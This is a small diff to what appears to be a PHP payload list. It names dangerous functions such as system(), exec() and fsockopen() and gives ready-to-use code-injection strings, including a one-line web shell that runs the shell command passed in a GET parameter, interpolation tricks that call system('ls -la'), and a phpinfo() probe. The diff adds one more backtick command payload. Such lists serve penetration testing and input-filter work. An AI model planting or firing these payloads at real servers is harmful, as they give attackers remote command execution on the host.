@@ -2,6 +2,7 @@
 ```
 system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen()
 <?=`$_GET[0]`?>
+<?=`ls -la`?>
 ${@print('test')}
 ${@system('ls -la')}
 <?php phpinfo(); ?>
